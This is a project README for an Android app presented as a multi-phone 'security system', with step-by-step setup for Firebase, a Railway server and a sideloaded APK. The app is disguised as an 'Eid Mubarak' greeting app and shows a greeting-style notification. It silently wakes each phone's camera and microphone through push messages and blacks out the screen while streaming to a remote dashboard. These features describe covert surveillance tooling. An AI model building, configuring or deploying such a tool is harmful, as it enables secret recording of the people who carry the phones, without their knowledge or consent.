# 🔬 Eid Lab Security System
### Multi-camera security system using Android phones

---

## 📁 Project Structure
```
eid-security-lab/
├── server.js          ← Node.js server (deploy to Railway)
├── package.json
├── public/
│   └── index.html     ← Security dashboard
└── camera-app/        ← Android APK source code
    ├── build.gradle
    └── src/main/
        ├── AndroidManifest.xml
        ├── java/com/eidlab/cam/
        │   ├── MainActivity.kt      ← Eid greeting screen
        │   ├── StreamService.kt     ← Background camera stream
        │   ├── BlackScreenActivity.kt ← Black screen while streaming
        │   └── EidFCMService.kt     ← FCM push receiver
        └── res/layout/
            ├── activity_main.xml    ← Eid greeting UI
            └── activity_black.xml  ← Black screen UI
```

---

## 🚀 Setup — 4 Steps

### Step 1 — Firebase (for remote wake)
1. Go to https://console.firebase.google.com
2. Create a new project → "Eid Lab"
3. Add Android app → package: `com.eidlab.cam`
4. Download `google-services.json` → place in `camera-app/`
5. Go to Project Settings → Cloud Messaging → copy **Server Key**

### Step 2 — Deploy server to Railway
1. Go to https://railway.app → New Project → Deploy from repo
   OR upload this folder via GitHub
2. Set environment variables in Railway:
   ```
   FCM_SERVER_KEY=your_firebase_server_key
   DASHBOARD_PASSWORD=your_secret_password
   PORT=3000
   ```
3. Copy your Railway URL e.g. `https://eid-lab.up.railway.app`

### Step 3 — Build the Android APK
1. Install Android Studio: https://developer.android.com/studio
2. Open the `camera-app/` folder in Android Studio
3. Update `server_url` in `MainActivity.kt`:
   ```kotlin
   putString("server_url", "wss://YOUR_RAILWAY_APP.up.railway.app")
   ```
4. Place your `google-services.json` in `camera-app/`
5. Build → Generate Signed APK (or just run on device for testing)

### Step 4 — Install on phones
1. Copy APK to each phone (via USB, email, or Google Drive)
2. Enable "Install from unknown sources" in phone settings
3. Install the APK — it appears as "Eid Mubarak" with moon icon
4. Open the app once on each phone → grant permissions
5. That's it — phones are registered and ready

---

## 📱 How it works day-to-day

```
Phones sit dormant — screen off, app sleeping
Battery barely drains (FCM listener uses ~1%/day)
         ↓
You open dashboard → yourapp.railway.app
Enter password
         ↓
See all registered phones listed
         ↓
Tap "Wake" on any camera
         ↓
FCM sends high-priority push to that phone
Phone wakes StreamService silently
Screen goes black
Camera + mic start streaming
         ↓
Live feed appears in dashboard
         ↓
Tap "Stop" → phone goes dormant again
```

---

## 🔋 Battery life estimates
| State | Battery drain |
|-------|--------------|
| Dormant (FCM listening) | ~1-2% per day |
| Actively streaming | ~15-20% per hour |
| Recommendation | Plug in when streaming long sessions |

---

## 📊 Dashboard features
- 🔴 Live video from all cameras simultaneously
- 🎙 Audio toggle per camera
- 📸 Auto snapshots every 30 seconds (saved on server)
- ⚡ Motion alerts with cell flashing
- 🌙 Wake / Stop any camera remotely
- 📱 Works on phone, tablet, laptop — any browser

---

## 🔐 Security notes
- Dashboard is password protected
- Change `DASHBOARD_PASSWORD` in Railway env vars
- Streams are peer-to-peer (WebRTC) — video not stored on server
- Only snapshots are stored on server
- Notification shows "Eid Mubarak" — looks like greeting app

---

## 🛠 Troubleshooting
| Problem | Fix |
|---------|-----|
| Camera won't wake | Check FCM_SERVER_KEY is set in Railway |
| No video in dashboard | Check WebSocket URL is `wss://` not `ws://` |
| App crashes on install | Enable "Install unknown apps" in Android settings |
| Stream laggy | Check WiFi/4G signal on camera phone |
